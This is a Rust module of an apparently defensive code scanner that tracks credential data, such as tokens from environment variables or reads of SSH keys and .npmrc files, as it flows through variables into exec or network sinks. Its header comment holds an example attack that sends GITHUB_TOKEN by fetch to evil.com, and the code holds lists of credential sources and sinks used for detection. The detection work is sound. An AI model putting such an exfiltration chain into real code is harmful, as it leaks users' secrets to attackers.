//! taint_tracker — M5: Taint tracking (fonte→sink via variáveis intermediárias)
//!
//! Rastreia o FLUXO de dado da fonte (env var, file read, network input) até o sink
//! perigoso (exec, eval, subprocess, rede), mesmo passando por variáveis intermediárias.
//!
//! Pega o ataque que fragmenta o payload em vários passos para escapar de regex/pattern:
//!   const secret = process.env.GITHUB_TOKEN;  // fonte tainted
//!   const payload = `key=${secret}`;           // propagação via template
//!   fetch('https://evil.com', { body: payload }); // sink → exfil_chain via variável
//!
//! Escopo mínimo viável (v1):
//!   - Intra-arquivo, intra-função
//!   - Fontes: env vars sensíveis, leitura de arquivos sensíveis
//!   - Propagação: atribuição direta, concatenação de string, template literal
//!   - Sinks: exec/eval/subprocess/child_process/rede
//!   - Severidade: MALICIOUS quando fonte de credencial tainted → sink de rede
//!
//! Determinístico: fluxo existe ou não existe — sem heurística probabilística.

use crate::DefenderViolation;
use std::collections::HashSet;

const SUGGESTION_TAINT: &str = "Credential data flows into a dangerous sink through variable(s). \
    Remove the network/exec sink or ensure credential data never reaches untrusted output.";

/// Nomes de variáveis que, mesmo sem ser fontes explícitas, ao receber valor de
/// uma fonte tainted e conter estas palavras-chave, propagam o taint.
/// Foca em nomes semanticamente relacionados a credenciais para reduzir falsos positivos.
const SENSITIVE_VAR_KEYWORDS: &[&str] = &[
    "token", "secret", "key", "password", "passwd", "pwd", "cred", "auth", "api", "private",
    "access", "bearer", "jwt",
];

/// Patterns de fontes que taintam uma variável (JavaScript/TypeScript)
const JS_TAINT_SOURCE_PATTERNS: &[(&str, &str)] = &[
    // Env vars sensíveis
    (
        r"process\.env\.(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|PYPI_TOKEN|SLACK_TOKEN|DISCORD_TOKEN|STRIPE_SECRET_KEY|STRIPE_KEY|SENDGRID_API_KEY|TWILIO_AUTH_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|CLOUDFLARE_API_TOKEN|HEROKU_API_KEY|DIGITALOCEAN_TOKEN|VERCEL_TOKEN|NETLIFY_AUTH_TOKEN)",
        "env_credential",
    ),
    (
        r"process\.env\.[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD|PASS|CRED|AUTH)[A-Z_]*",
        "env_sensitive",
    ),
    // File reads de arquivos sensíveis
    (
        r#"readFileSync\s*\(\s*['"][^'"]*(?:\.env|\.npmrc|\.pypirc|id_rsa|id_ed25519|authorized_keys|credentials|\.git-credentials|\.bash_history|\.zsh_history)[^'"]*['"]"#,
        "file_credential",
    ),
    (
        r#"readFile\s*\(\s*['"][^'"]*(?:\.env|\.npmrc|\.pypirc|id_rsa|credentials)[^'"]*['"]"#,
        "file_credential",
    ),
];

/// Patterns de fontes que taintam uma variável (Python)
const PY_TAINT_SOURCE_PATTERNS: &[(&str, &str)] = &[
    // os.environ
    (
        r#"os\.environ(?:\.get)?\s*\(\s*['"](?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|SLACK_TOKEN)['"]\s*"#,
        "env_credential",
    ),
    (
        r#"os\.environ(?:\.get)?\s*\(\s*['"][A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD|PASS)[A-Z_]*['"]\s*"#,
        "env_sensitive",
    ),
    (
        r#"os\.getenv\s*\(\s*['"][A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)[A-Z_]*['"]\s*"#,
        "env_sensitive",
    ),
    // File reads
    (
        r#"open\s*\(\s*['"][^'"]*(?:\.env|\.ssh/|credentials|\.bash_history)[^'"]*['"]\s*\)"#,
        "file_credential",
    ),
];

/// Sinks de execução que consumir dados tainted é perigoso
const EXEC_SINK_PATTERNS: &[&str] = &[
    r"\beval\s*\(",
    r"\bexec\s*\(",
    r"\bexecSync\s*\(",
    r"\bspawn\s*\(",
    r"\bspawnSync\s*\(",
    r"\bexecFile\s*\(",
    r"\bchild_process\b",
    r"\bos\.system\s*\(",
    r"\bsubprocess\.(run|call|Popen|check_output)\s*\(",
];

/// Sinks de rede que consumir dados tainted é exfiltração
const NETWORK_SINK_PATTERNS: &[&str] = &[
    r"\bfetch\s*\(",
    r"\baxios\.(get|post|put|patch|delete|request)\s*\(",
    r"\bhttps?\.request\s*\(",
    r"\bhttps?\.get\s*\(",
    r"\bnew\s+WebSocket\s*\(",
    r"\bsocket\.connect\s*\(",
    r"\bnet\.connect\s*\(",
    r"\brequests\.(get|post|put|patch|delete)\s*\(",
    r"\burllib\.request\.urlopen\s*\(",
];

/// Extrai o nome de variável de uma linha de atribuição.
/// Suporta:
///   const foo = ...
///   let foo = ...
///   var foo = ...
///   foo = ...
///   self.foo = ...
fn extract_varname(line: &str) -> Option<&str> {
    let line = line.trim();

    // Remove prefixos JS/TS
    let stripped = line
        .strip_prefix("const ")
        .or_else(|| line.strip_prefix("let "))
        .or_else(|| line.strip_prefix("var "))
        .unwrap_or(line);

    // Encontrar a parte antes do '='
    if let Some(before_eq) = stripped.split('=').next() {
        let varname = before_eq
            .trim()
            .trim_end_matches(|c: char| !c.is_alphanumeric() && c != '_');

        // Remover 'self.' prefix para Python
        let varname = varname.strip_prefix("self.").unwrap_or(varname);

        if !varname.is_empty() && varname.chars().all(|c| c.is_alphanumeric() || c == '_') {
            return Some(varname);
        }
    }
    None
}

/// Verifica se o nome da variável contém palavras-chave de credencial.
fn is_sensitive_varname(varname: &str) -> bool {
    let lower = varname.to_lowercase();
    SENSITIVE_VAR_KEYWORDS.iter().any(|kw| lower.contains(kw))
}

/// Verifica se uma linha atribui um valor tainted (fonte explícita) a uma variável.
/// Retorna (varname, source_type) se encontrar.
fn detect_taint_source_js(line: &str) -> Option<(String, String)> {
    let varname = extract_varname(line)?;

    for (pattern_str, source_type) in JS_TAINT_SOURCE_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern_str) {
            if re.is_match(line) {
                return Some((varname.to_string(), source_type.to_string()));
            }
        }
    }
    None
}

fn detect_taint_source_py(line: &str) -> Option<(String, String)> {
    let varname = extract_varname(line)?;

    for (pattern_str, source_type) in PY_TAINT_SOURCE_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern_str) {
            if re.is_match(line) {
                return Some((varname.to_string(), source_type.to_string()));
            }
        }
    }
    None
}

/// Verifica se uma linha propagação o taint de uma variável conhecida para uma nova.
/// Retorna o nome da nova variável se encontrar propagação.
fn detect_taint_propagation(line: &str, tainted: &HashSet<String>) -> Option<String> {
    let new_var = extract_varname(line)?;

    // Verificar se alguma variável tainted aparece no lado direito
    let rhs = line.split_once('=').map(|(_, r)| r).unwrap_or("");
    for tvar in tainted {
        // Match como palavra inteira para evitar falsos positivos
        let word_re = format!(r"\b{}\b", regex::escape(tvar));
        if let Ok(re) = regex::Regex::new(&word_re) {
            if re.is_match(rhs) {
                return Some(new_var.to_string());
            }
        }
    }
    None
}

/// Verifica se uma linha contém uso de variável tainted em um sink.
fn detect_taint_in_sink(
    line: &str,
    line_num: u32,
    tainted: &HashSet<String>,
    sink_patterns: &[&str],
    sink_type: &str,
    source_type: &str,
) -> Option<DefenderViolation> {
    // Verificar se a linha contém um sink
    let has_sink = sink_patterns.iter().any(|p| {
        regex::Regex::new(p)
            .map(|re| re.is_match(line))
            .unwrap_or(false)
    });

    if !has_sink {
        return None;
    }

    // Verificar se alguma variável tainted aparece na linha com o sink
    for tvar in tainted {
        let word_re = format!(r"\b{}\b", regex::escape(tvar));
        if let Ok(re) = regex::Regex::new(&word_re) {
            if re.is_match(line) {
                let evidence: String = line.chars().take(120).collect();
                let severity_label = if sink_type == "network" && source_type.contains("credential")
                {
                    "CRITICAL exfil_chain via variable"
                } else {
                    "taint flow"
                };

                return Some(DefenderViolation {
                    visitor: "taint_tracker".to_string(),
                    line: line_num,
                    col: 1,
                    evidence,
                    decoded: None,
                    message: format!(
                        "Taint flow detected [{severity_label}]: credential/sensitive data in variable \
                        '{tvar}' (source: {source_type}) reaches {sink_type} sink. \
                        Data flows from sensitive source through variable to dangerous output."
                    ),
                    suggestion: Some(SUGGESTION_TAINT.to_string()),
                });
            }
        }
    }
    None
}

/// Scan JavaScript/TypeScript for taint flows.
pub fn scan_js(content: &str) -> Vec<DefenderViolation> {
    let mut violations = Vec::new();
    let mut tainted_vars: HashSet<String> = HashSet::new();
    let mut tainted_sources: std::collections::HashMap<String, String> =
        std::collections::HashMap::new();

    // Pass 1: collect taint sources
    for (line_idx, line) in content.lines().enumerate() {
        let line_num = (line_idx + 1) as u32;

        if let Some((varname, source_type)) = detect_taint_source_js(line) {
            tainted_vars.insert(varname.clone());
            tainted_sources.insert(varname.clone(), source_type.clone());
            // Also consider propagation from sensitive var names
            let _ = (line_num, varname, source_type);
        }
    }

    // Pass 2: propagate taint through assignments
    for line in content.lines() {
        if let Some(new_var) = detect_taint_propagation(line, &tainted_vars) {
            // Propagate source type from the first tainted var found in rhs
            let rhs = line.split_once('=').map(|(_, r)| r).unwrap_or("");
            for tvar in &tainted_vars.clone() {
                let word_re = format!(r"\b{}\b", regex::escape(tvar));
                if let Ok(re) = regex::Regex::new(&word_re) {
                    if re.is_match(rhs) {
                        let source = tainted_sources.get(tvar).cloned().unwrap_or_default();
                        tainted_vars.insert(new_var.clone());
                        tainted_sources.entry(new_var.clone()).or_insert(source);
                        break;
                    }
                }
            }
        }
    }

    if tainted_vars.is_empty() {
        return violations;
    }

    // Pass 3: detect tainted vars reaching sinks
    for (line_idx, line) in content.lines().enumerate() {
        let line_num = (line_idx + 1) as u32;

        // Check exec sinks
        let source_type = tainted_vars
            .iter()
            .find_map(|v| {
                let word_re = format!(r"\b{}\b", regex::escape(v));
                regex::Regex::new(&word_re).ok().and_then(|re| {
                    if re.is_match(line) {
                        tainted_sources.get(v).cloned()
                    } else {
                        None
                    }
                })
            })
            .unwrap_or_default();

        if let Some(v) = detect_taint_in_sink(
            line,
            line_num,
            &tainted_vars,
            EXEC_SINK_PATTERNS,
            "exec/eval",
            &source_type,
        ) {
            violations.push(v);
        }

        // Check network sinks
        if let Some(v) = detect_taint_in_sink(
            line,
            line_num,
            &tainted_vars,
            NETWORK_SINK_PATTERNS,
            "network",
            &source_type,
        ) {
            violations.push(v);
        }
    }

    violations
}

/// Scan Python for taint flows.
pub fn scan_py(content: &str) -> Vec<DefenderViolation> {
    let mut violations = Vec::new();
    let mut tainted_vars: HashSet<String> = HashSet::new();
    let mut tainted_sources: std::collections::HashMap<String, String> =
        std::collections::HashMap::new();

    // Pass 1: collect taint sources
    for line in content.lines() {
        if let Some((varname, source_type)) = detect_taint_source_py(line) {
            tainted_vars.insert(varname.clone());
            tainted_sources.insert(varname, source_type);
        }
    }

    // Pass 2: propagate
    for line in content.lines() {
        if let Some(new_var) = detect_taint_propagation(line, &tainted_vars) {
            let rhs = line.split_once('=').map(|(_, r)| r).unwrap_or("");
            for tvar in &tainted_vars.clone() {
                let word_re = format!(r"\b{}\b", regex::escape(tvar));
                if let Ok(re) = regex::Regex::new(&word_re) {
                    if re.is_match(rhs) {
                        let source = tainted_sources.get(tvar).cloned().unwrap_or_default();
                        tainted_vars.insert(new_var.clone());
                        tainted_sources.entry(new_var.clone()).or_insert(source);
                        break;
                    }
                }
            }
        }
    }

    if tainted_vars.is_empty() {
        return violations;
    }

    // Pass 3: detect sinks
    for (line_idx, line) in content.lines().enumerate() {
        let line_num = (line_idx + 1) as u32;

        let source_type = tainted_vars
            .iter()
            .find_map(|v| {
                let word_re = format!(r"\b{}\b", regex::escape(v));
                regex::Regex::new(&word_re).ok().and_then(|re| {
                    if re.is_match(line) {
                        tainted_sources.get(v).cloned()
                    } else {
                        None
                    }
                })
            })
            .unwrap_or_default();

        if let Some(v) = detect_taint_in_sink(
            line,
            line_num,
            &tainted_vars,
            EXEC_SINK_PATTERNS,
            "exec/eval",
            &source_type,
        ) {
            violations.push(v);
        }
        if let Some(v) = detect_taint_in_sink(
            line,
            line_num,
            &tainted_vars,
            NETWORK_SINK_PATTERNS,
            "network",
            &source_type,
        ) {
            violations.push(v);
        }
    }

    violations
}

/// Entry point: scan content for taint flows based on language.
/// Called from ast_scanner after language detection.
pub fn scan_js_content(content: &[u8]) -> Vec<DefenderViolation> {
    match std::str::from_utf8(content) {
        Ok(text) => scan_js(text),
        Err(_) => Vec::new(),
    }
}

pub fn scan_py_content(content: &[u8]) -> Vec<DefenderViolation> {
    match std::str::from_utf8(content) {
        Ok(text) => scan_py(text),
        Err(_) => Vec::new(),
    }
}

// Suppress unused import warnings for helper functions used only internally
#[allow(dead_code)]
fn _use_sensitive_varname(v: &str) -> bool {
    is_sensitive_varname(v)
}
